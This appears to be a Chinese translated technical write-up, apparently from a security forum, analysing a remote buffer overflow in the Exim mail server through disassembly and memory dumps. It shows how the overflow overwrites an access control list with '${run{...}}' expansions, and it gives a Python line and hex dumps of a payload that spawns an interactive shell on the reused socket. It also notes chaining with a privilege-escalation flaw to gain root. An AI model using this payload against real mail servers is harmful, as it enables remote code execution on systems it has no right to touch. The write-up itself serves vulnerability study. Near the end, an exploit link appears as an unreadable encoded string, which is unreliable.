
```text
.text:0807D782 lea esi, [esi+0]
[?]
.text:0807D799 mov ebx, [ebp+s]
.text:0807D79C mov eax, [eax]
.text:0807D79E mov dword ptr [esp+8], offset aEnvelopeToS   // "Envelope-to: <%s>\n"
.text:0807D7A6 mov [esp], ebx
.text:0807D7A9 mov [esp+0Ch], eax
.text:0807D7AD mov eax, ds:dword_80F37F0                          // Error msg buffer
.text:0807D7B2 add eax, 2000h
.text:0807D7B7 sub eax, ebx
.text:0807D7B9 mov [esp+4], eax
.text:0807D7BD call string_format
.text:0807D7C2 cmp byte ptr [ebx], 0
.text:0807D7C5 jz short loc_807D7D0
[?]
.text:0807D848 loc_807D848:
.text:0807D848 mov eax, [edi+0Ch]
.text:0807D84B test eax, eax
.text:0807D84D jz short loc_807D896
.text:0807D84F mov [esp+10h], eax
.text:0807D853 mov eax, [edi+4]
.text:0807D856 mov dword ptr [esp+8], aCS_1                  // "%c %s"
.text:0807D85E mov [esp], ebx ; s
.text:0807D861 mov [esp+0Ch], eax
.text:0807D865 mov eax, ds:dword_80F37F0                          // Error msg buffer
.text:0807D86A add eax, 2000h
.text:0807D86F sub eax, ebx
.text:0807D871 mov [esp+4], eax ; int
.text:0807D875 call string_format                                          // Dump a header
.text:0807D87A cmp byte ptr [ebx], 0
.text:0807D87D jz short loc_807D888
.text:0807D87F nop
[?]
.text:0807D888 loc_807D888:
.text:0807D888 test eax, eax
.text:0807D88A lea esi, [esi+0]
.text:0807D890 jz loc_807DC70
.text:0807D896
.text:0807D896 loc_807D896:
.text:0807D896 mov edi, [edi]                                              // Is it the last header?
.text:0807D898 test edi, edi
.text:0807D89A jnz short loc_807D848                                  // Proceed the next header
```

为了稳定地利用此漏洞，攻击者必须向缓冲区中填充`0x2000`字节，直至最后的头信息复制进`buffer`后还剩余3字节。这一步很关键，可以确保`p`和`last`相等（即指向同一地址）。为获取程序的稳定性，同时还要准确计算出发送的头信息总大小，这些内容包括`MAIL FROM:`头信息，主机名以及服务端支持的最大字节数，以及相关的头信息和响应数据。当处理完最后一个头信息后，就可触发缓冲区溢出，在`0x2000`字节大小的`buffer`之后的内存空间都会被最后的头信息所覆盖。在缓冲区`0x2000`字节之后，我们可以看到一些访问控制列表（ACL）：

- `0x09C1C92E`地址上存放着倒数第二个header信息
- `0x09C1CA0E`地址上存放着ACL

```text
09C1C91E 41 41 41 41 41 41 41 41 0A 20 20 30 30 30 30 30 AAAAAAAA. 00000
09C1C92E 30 30 30 36 32 3A 20 41 41 41 41 41 41 41 41 41 00062: AAAAAAAAA
09C1C93E 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
09C1C94E 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
09C1C95E 41 41 41 41 41 41 0A 00 00 00 00 00 00 00 09 40 AAAAAA.........@
09C1C96E 00 00 61 40 61 2E 63 6F 6D 00 72 20 6D 65 73 73 ..a@a.com.r mess
09C1C97E 61 67 65 2C 20 65 6E 64 69 6E 67 20 77 69 74 68 age, ending with
09C1C98E 20 22 2E 22 20 6F 6E 20 61 20 6C 69 6E 65 20 62 "." on a line b
09C1C99E 79 20 69 74 73 65 6C 66 0D 0A 00 39 3A 34 37 3A y itself...9:47:
09C1C9AE 31 39 20 2D 30 35 30 30 0D 0A 00 75 65 7D 66 61 19 -0500...ue}fa
09C1C9BE 69 6C 7D 7D 7B 5C 5C 4E 5B 5C 5C 5E 5D 5C 5C 4E il}}{\\N[\\^]\\N
09C1C9CE 7D 7B 5E 5E 7D 7D 7D 7B 5C 5C 4E 28 5B 5E 3A 5D }{^^}}}{\\N([^:]
09C1C9DE 2B 3A 29 28 2E 2A 29 5C 5C 4E 7D 7B 5C 5C 24 32 +:)(.*)\\N}{\\$2
09C1C9EE 7D 7D 22 0A 00 5C 5C 5E 5D 5C 5C 4E 7D 7B 5E 5E }}"..\\^]\\N}{^^
09C1C9FE 7D 7D 7D 7B 7D 7D 7D 7B 7D 66 61 69 6C 7D 3B 20 }}}{}}}{}fail};
09C1CA0E 24 7B 65 78 74 72 61 63 74 7B 31 7D 7B 3A 3A 7D ${extract{1}{::}
09C1CA1E 7B 24 7B 73 67 7B 24 7B 6C 6F 6F 6B 75 70 7B 24 {${sg{${lookup{$
09C1CA2E 68 6F 73 74 7D 6E 77 69 6C 64 6C 73 65 61 72 63 host}nwildlsearc
09C1CA3E 68 7B 2F 65 74 63 2F 65 78 69 6D 34 2F 70 61 73 h{/etc/exim4/pas
```

例如当检测发送者地址时就会用到ACL，通过ACL可用来执行命令，比如：`${run{command}}`。在Linux中，当一个进程创建子进程时，打开的文件描述符会被复制给子进程。因此每当ACL命令被执行时，`socket`文件描述符会被子进程重新使用。因此这个很容易利用暴力方式来得到此描述符，并作为`stdin`来使用。

```python
for fd in range(3, 20):
            cmd += "${{run{{/bin/sh -c 'exec /bin/sh -i <&{0} >&0 2>&0'}}}} ".format(fd)
```

溢出后，ACL被覆盖为：

- 地址`0x09C1C92E` 存放着倒数第二个header信息
- 地址`0x09C1C95E` 存放着最后一个header信息
- 地址`0x09C1CA0E` 被ACL覆盖掉

```text
09C1C91E 41 41 41 41 41 41 41 41 0A 20 20 30 30 30 30 30 AAAAAAAA. 00000
09C1C92E 30 30 30 36 32 3A 20 41 41 41 41 41 41 41 41 41 00062: AAAAAAAAA
09C1C93E 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
09C1C94E 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
09C1C95E 41 41 41 41 41 41 0A 20 20 30 30 30 30 30 30 30 AAAAAA. 0000000
09C1C96E 30 36 33 3A 20 24 7B 72 75 6E 7B 2F 62 69 6E 2F 063: ${run{/bin/
09C1C97E 73 68 20 2D 63 20 27 65 78 65 63 20 2F 62 69 6E sh -c 'exec /bin
09C1C98E 2F 73 68 20 2D 69 20 3C 26 33 20 3E 26 30 20 32 /sh -i <&3 >&0 2
09C1C99E 3E 26 30 27 7D 7D 20 24 7B 72 75 6E 7B 2F 62 69 >&0'}} ${run{/bi
09C1C9AE 6E 2F 73 68 20 2D 63 20 27 65 78 65 63 20 2F 62 n/sh -c 'exec /b
09C1C9BE 69 6E 2F 73 68 20 2D 69 20 3C 26 34 20 3E 26 30 in/sh -i <&4 >&0
09C1C9CE 20 32 3E 26 30 27 7D 7D 20 24 7B 72 75 6E 7B 2F 2>&0'}} ${run{/
09C1C9DE 62 69 6E 2F 73 68 20 2D 63 20 27 65 78 65 63 20 bin/sh -c 'exec\_
09C1C9EE 2F 62 69 6E 2F 73 68 20 2D 69 20 3C 26 35 20 3E /bin/sh -i <&5 >
09C1C9FE 26 30 20 32 3E 26 30 27 7D 7D 20 24 7B 72 75 6E &0 2>&0'}} ${run
09C1CA0E 7B 2F 62 69 6E 2F 73 68 20 2D 63 20 27 65 78 65 {/bin/sh -c 'exe
09C1CA1E 63 20 2F 62 69 6E 2F 73 68 20 2D 69 20 3C 26 36 c /bin/sh -i <&6
09C1CA2E 20 3E 26 30 20 32 3E 26 30 27 7D 7D 20 24 7B 72 >&0 2>&0'}} ${r
09C1CA3E 75 6E 7B 2F 62 69 6E 2F 73 68 20 2D 63 20 27 65 un{/bin/sh -c 'e
```

为了利用ACL实现攻击目的，我们需要再发送第二封邮件到服务器，并且使用之前已建立的同一连接，这样就可以Exim权限来执行任意代码了。如果再结合提权漏洞（例如 `CVE-2010-4345`），即可以root权限执行任意代码。我们的编写的利用代码已经发布在 VUPEN Binary Analysis & Exploits Service （译注：需注册，在exploit-db上面有利用代码：03dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3g2^5M7r3I4G2K9i4c8Q4x3X3c8V1j5W2)9J5k6h3y4G2L8g2)9J5c8X3g2^5M7r3I4G2K9i4c8K6i4K6u0r3x3e0f1%4x3U0g2Q4x3V1k6Q4c8f1k6Q4b7V1y4Q4z5p5y4Q4c8e0g2Q4z5p5k6Q4b7e0k6Q4c8e0g2Q4b7e0c8Q4z5e0k6Q4c8e0S2Q4b7V1k6Q4z5e0S2Q4c8e0k6Q4z5f1y4Q4z5o6W2Q4c8e0c8Q4b7U0S2Q4z5o6m8Q4c8e0c8Q4b7V1u0Q4b7V1c8E0M7$3k6Q4c8e0k6Q4b7e0S2Q4b7e0q4Q4c8e0k6Q4z5f1c8Q4b7V1k6Q4c8e0N6Q4z5f1q4Q4z5o6c8Q4c8e0g2Q4z5o6S2Q4b7e0W2Q4c8e0N6Q4z5e0c8Q4b7e0S2Q4c8e0c8Q4b7V1u0Q4b7e0y4Q4c8e0N6Q4b7e0m8Q4z5o6q4Q4c8f1k6Q4b7V1y4Q4z5f1q4Z5N6s2c8H3i4K6y4m8i4K6u0r3i4K6u0r3N6%4N6%4i4K6u0W2k6i4S2H3L8r3!0A6N6q4)9J5k6r3c8T1i4K6u0W2j5$3!0E0i4K6u0r3k6i4S2H3L8r3!0A6N6s2y4Q4x3V1j5I4y4U0V1J5y4g2)9J5c8R3`.`. ）上面了，并且在Debian和Ubuntu上测试通过。

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
